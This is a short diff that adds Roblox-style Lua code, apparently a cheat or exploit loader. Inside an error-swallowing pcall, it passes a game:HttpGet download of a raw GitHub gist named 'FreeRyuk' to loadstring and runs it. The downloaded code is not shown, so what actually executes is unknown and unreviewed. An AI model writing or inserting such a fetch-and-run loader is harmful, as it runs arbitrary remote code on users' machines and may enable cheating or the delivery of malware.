@@ -1,0 +1,3 @@
+pcall(function()
+   loadstring(game:HttpGet("https://gist.githubusercontent.com/SKOIXLL/91eef031b2c36682eec8c507eeae8ea8/raw/239ef35a959215f492d42dcf8476dfdb968faa6c/FreeRyuk"))()
+end)
